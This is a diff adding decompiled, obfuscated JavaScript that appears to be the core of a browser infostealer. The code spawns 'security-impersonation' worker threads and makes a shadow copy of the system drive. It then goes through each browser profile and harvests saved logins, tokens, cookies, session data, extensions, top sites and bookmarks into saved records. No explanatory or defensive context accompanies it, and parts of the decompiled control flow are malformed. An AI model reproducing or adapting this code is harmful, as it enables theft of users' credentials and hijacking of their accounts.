@@ -1,0 +1,458 @@
+function func_extractInput_0x10000b837(a0)
+{
+	return func_checkWorkers_0x1000006e6(a0["input"])
+}
+function func_spawnImpersonation_0x10000a9a5(a0)
+{
+	return func_spawnWorker_0x100000005(("security-impersonation"), a0)
+}
+function func_workerPool_0x100006759(a0)
+{
+	r1 = <closure>
+	ACCU = <closure>
+	ACCU = r0
+	r6 = supper(r0)
+	ACCU = <this>
+	<this> = r6
+	ACCU = <this>
+	<this>["createWorker"] = a0
+	ACCU = <this>
+	<this>["pool"] = Map(r0)
+	ACCU = <this>
+	ACCU = <this>
+	r6 = <this>["rebuildWorkers"]["bind"]
+	ACCU = <this>
+	<this>["rebuildWorkers"] = r6(<this>)
+	ACCU = <this>
+	r7 = <this>["rebuildWorkers"]
+	ACCU = global_OV["on"]("sessions", r7)
+	return <this>
+}
+function func_checkWorkers_0x1000006e6(a0)
+{
+	Scope[10732][2] = a0
+	r3 = <closure>
+	r4 = <this>
+	r0 = a0
+	ACCU = func_r_0x1000006e3
+	Scope[10732][4] = func_r_0x1000006e3
+	try
+	{
+		r6 = Promise["allSettled"]
+		r9 = (func_workerPool_0x100006759(func_spawnImpersonation_0x10000a9a5))["all"]
+		r9 = r9()
+		r8 = r9["map"]
+		r8 = r8(func_parse_0x1000006e4)
+		r7 = r6(r8)
+		r6 = r0
+		r6 = await r7
+		r7 = _GeneratorGetResumeMode(r0)
+		if (!r7 === 0)
+		{
+			ACCU = r6
+		}
+		r5 = r6["map"]
+		r5 = r5(func_isFulfilled_0x1000006e5)
+		r4 = r5["some"]
+		r5 = r4(Boolean)
+		r4 = r0
+		ACCU = r5
+		return r5
+	}
+	catch {}
+	r4 = ACCU
+	ACCU = null
+	ACCU = Scope[10733]
+	r5 = r0
+	return Scope[10733][2]
+}
+function func_isFulfilled_0x1000006e5(a0)
+{
+	return a0["status"] === "fulfilled"
+}
+function func_parse_0x1000006e4(a0)
+{
+	return func_collectProfiles_0x100000662(a0, Scope[10732][2])
+}
+function func_collectProfiles_0x100000662(a0, a1)
+{
+	r25 = <closure>
+	r26 = <this>
+	ACCU = func_x_0x100000657
+	try
+	{
+		r1 = new {"V": "]1@2", "J": 94473, "S": "iSZ6", "g": 16390, "L": 89082, "X": "89J2", "j": 6028, "E": ")Lyh", "c": 55516, "x": "p[w*", "K": 56564, "u": "vV[N", "A": 44144, "s": "xQ)2", "b": 51697, "i": "x&b0", "w": 23949, "f": 45559, "t": "%r7r", "P": 91438, "I": "JrBU", "p": 1896, "o": 90587, "R": "pdVE", "v": 35777, "N": "epz[", "M": 71425, "k": "^Ceg", "Q": 65067, "W": "]C&)", "T": 30132, "G": "vV[N", "y": 104676, "e": "[()[", "U": 46125, "q": "toM2", "O": 62771, "C": "I@Bf", "n": 111612, "r": 60014, "H": "*!!t", "h": 51213, "Y": "C0qY", "D": 20034, "l": "[Jy3", "a": 91654, "V0": "BS4&", "V1": 71298, "V2": 17173, "V3": "Yx9u", "V6": 63951, "VV": "h98j", "VJ": 80708, "Vz": "n@A0", "Vd": 114995, "Vg": ")Ku4", "VL": 29714, "Vc": "A5nh", "Vx": 15778, "VB": 89390, "VK": "O9*f", "Vu": 105968, "VA": "M2Ty", "Vs": 33876, "Vb": "gm42", "Vw": 123437, "Vf": "b48I", "Vt": 125282, "VP": 54333, "Vp": "M2Ty", "Vo": 119771, "VR": "m[K#", "VQ": 91758, "VW": "A0Dr", "VT": 120496, "VG": "%]hf", "Vy": 84647, "Ve": "]1@2", "VU": 109819, "Vq": "eeST", "VO": 39345, "Vm": "8dGo", "VZ": 59561, "Vn": "]C&)", "Vr": 14854, "VH": "VHeU", "Vh": 13076, "VY": "[Jy3", "VD": 106131, "Vl": "F1xf", "Va": 100561}
+		r3 = a0["info"]["sid"]
+		ACCU = a1
+		r29 = a1
+		r27 = r2
+		if (!a1 == undefined)
+		{
+			ACCU = r29["user"]
+		}
+		else
+		{
+			ACCU = undefined
+		}
+		r29 = ACCU
+		if (!func_equals_0x100000666(r29, r3))
+		{
+			return false
+		}
+		r27 = a0["rpc"]["getUserDirectory"]
+		r26 = r27["query"]
+		r27 = r26()
+		r26 = await r27
+		r27 = _GeneratorGetResumeMode(Scope[10811])
+		if (!r27 === 0)
+		{
+			ACCU = r26
+		}
+		r4 = r26
+		r26 = (require("path"))["parse"]
+		r26 = r26(r4)
+		r5 = r26["root"]
+		r30 = r1["I"]
+		r27 = global_Lz["createShadowCopy"](r5)
+		r26 = await r27
+		r27 = _GeneratorGetResumeMode(Scope[10811])
+		if (!r27 === 0)
+		{
+			ACCU = r26
+		}
+		ACCU = r26["dispose"]
+		r7 = r26["dispose"]
+		try
+		{
+			r30 = r2
+			r11 = func_relpath_0x100000524(r4, r5, r26["path"])
+			r32 = r1["N"]
+			r33 = r1["k"]
+			r31 = global_Oz["iterBrowsers"]()
+			r30 = GetIterator(r31)
+			r29 = r30["next"]
+			ACCU = false
+			r31 = false
+			try
+			{
+				while (true)
+				{
+					r31 = true
+					r35 = r29()
+					if (r35["done"]) break
+					r31 = false
+					r13 = r35["value"]
+					ACCU = a1
+					r39 = a1
+					r37 = r2
+					if (!a1 == undefined)
+					{
+						ACCU = r39["application"]
+					}
+					else
+					{
+						ACCU = undefined
+					}
+					r39 = ACCU
+					r43 = r1["C"]
+					if (!func_equals_0x100000666(r39, r35["value"]["application"])) continue
+					r40 = r1["H"]
+					r39 = a0["id"]
+					r38 = r35["value"]["iterProfiles"](r11, a0["id"])
+					ACCU = r38[Symbol.asyncIterator]
+					if (!r38[Symbol.asyncIterator] == undefined)
+					{
+						r39 = r38[Symbol.asyncIterator]
+						ACCU = r38[Symbol.asyncIterator]()
+					}
+					r37 = ACCU
+					r36 = r37["next"]
+					ACCU = false
+					r38 = false
+					try
+					{
+						while (true)
+						{
+							r38 = true
+							r44 = r36()
+							r43 = await r44
+							r44 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r44 === 0)
+							{
+								ACCU = r43
+							}
+							ACCU = r43
+							r42 = r43
+							if (r42["done"]) break
+							r38 = false
+							r15 = r42["value"]
+							r48 = r42["value"]["path"]
+							r46 = r2
+							r49 = r11
+							r50 = r4
+							r17 = func_relpath_0x100000524(r48, r49, r50)
+							r42 = r42["value"]
+							ACCU = a1
+							r48 = a1
+							r46 = r2
+							if (!a1 == undefined)
+							{
+								ACCU = r48["profile"]
+							}
+							else
+							{
+								ACCU = undefined
+							}
+							r48 = ACCU
+							r49 = r17
+							if (!func_equals_0x100000666(r48, r49))
+							{
+								continue
+							}
+							r46 = func_collectLogins_0x10000062d(r15)
+							r45 = r46["catch"]
+							r46 = r45(func_noop_0x1000004cf)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							r46 = func_iterateTokens_0x100000632(r15)
+							r45 = r46["catch"]
+							r46 = r45(func_noop_0x1000004cf)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							r45 = r15["getExpiryDate"]
+							r18 = r45()
+							r48 = Date(Scope[10811])
+							if (r18 < r48)
+							{
+								continue
+							}
+							r46 = func_extensions_0x100000634(r15)
+							r45 = r46["catch"]
+							r46 = r45(func_noop_0x1000004cf)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							r19 = r45
+							r47 = r2
+							r49 = r15
+							r46 = func_topUrls_0x10000063c(r49, 15)
+							r45 = r46["catch"]
+							r46 = r45(func_noop_0x1000004cf)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							r20 = r45
+							r47 = r2
+							r49 = r15
+							r46 = func_collectBookmarks_0x100000641(r49, 15)
+							r45 = r46["catch"]
+							r46 = r45(func_noop_0x1000004cf)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							r21 = r45
+							r46 = func_Cookies_0x100000653(r15)
+							r45 = r46["catch"]
+							r46 = r45(func_noop_0x1000004cf)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							r22 = r45
+							r46 = func_collectSessions_0x100000656(r15)
+							r45 = r46["catch"]
+							r46 = r45(func_noop_0x1000004cf)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							r23 = r45
+							r49 = new {"application": null, "user": null, "path": null, "extensions": null, "topOrigins": null, "topBookmarks": null, "cookies": null, "sessions": null, "expiresAt": null}
+							r49["application"] = r13["application"]
+							r49["user"] = r3
+							r49["path"] = r17
+							r49["extensions"] = r19
+							r49["topOrigins"] = r20
+							r49["topBookmarks"] = r21
+							r49["cookies"] = r22
+							r49["sessions"] = r23
+							r49["expiresAt"] = r18
+							r46 = func_saveProfile_0x1000005df(r49)
+							r45 = r46["catch"]
+							r50 = new {"application": null, "user": null, "path": null}
+							r50["application"] = r13["application"]
+							r50["user"] = r3
+							r50["path"] = r17
+							r47 = func_abortError_0x100000144(r50)
+							r46 = r45(r47)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							if (!a1) continue
+							r40 = true
+							ACCU = 1
+							r39 = 1
+							break
+						}
+						ACCU = -1
+						r40 = -1
+						r39 = -1
+					}
+					catch
+					{
+						r40 = ACCU
+						r39 = 0
+					}
+					if (!r38)
+					{
+						try
+						{
+							if (!r37["return"] == undefined)
+							{
+								r48 = r37["return"]()
+								r47 = await r48
+								r48 = _GeneratorGetResumeMode(Scope[10811])
+								if (!r48 === 0)
+								{
+									ACCU = r47
+								}
+								ACCU = r47
+							}
+							catch {}
+						}
+					}
+					ACCU = null
+					switch (r39)
+					default:
+					{
+						continue
+					}
+					case (0):
+					{
+						r32 = 0
+						r33 = r40
+						break
+					}
+					case (1):
+					{}
+					ACCU = 1
+					r32 = 1
+					r33 = r40
+					break
+				}
+				ACCU = -1
+				r33 = -1
+				r32 = -1
+			}
+			catch
+			{
+				r33 = ACCU
+				r32 = 0
+			}
+			if (!r31)
+			{
+				try
+				{
+					if (!r30["return"] == undefined)
+					{
+						ACCU = r30["return"]()
+					}
+					catch {}
+				}
+			}
+			ACCU = null
+			ACCU = r32
+			switch (r32)
+			default:
+			{
+				break
+			}
+			case (0):
+			{
+				r26 = 0
+				r27 = r33
+				break
+			}
+			case (1):
+			{
+				r26 = 1
+				r27 = r33
+			}
+			default:
+			{
+				break
+				r27 = -1
+				r26 = -1
+			}
+		}
+		catch
+		{
+			r27 = ACCU
+			r26 = 0
+		}
+		ACCU = r7()
+		ACCU = null
+		switch (r26)
+		default:
+		{
+			break
+		}
+		case (0):
+		{
+			ACCU = r27
+		}
+		case (1):
+		{
+			return r27
+		}
+		r27 = !Boolean(a1)
+		ACCU = r27
+		return r27
+	}
+	catch {}
+	r26 = ACCU
+	ACCU = null
+	ACCU = Scope[10812]
+	return Scope[10812][2]
+}
+function func_spawnWorker_0x100000005(a0, a1)
+{
+	if (!(a0))
+	{
+		ACCU = Error
+		ACCU = Error("Worker root not configured")
+	}
+	r5 = new {"poolId": null, "initial": null}
+	r5["poolId"] = a0
+	r5["initial"] = a1
+	r3 = r5
+	r5 = (require("worker_threads"))["Worker"]
+	r7 = new {"workerData": null}
+	r7["workerData"] = r3
+	ACCU = r5
+	return r5((a0), r7)
+}
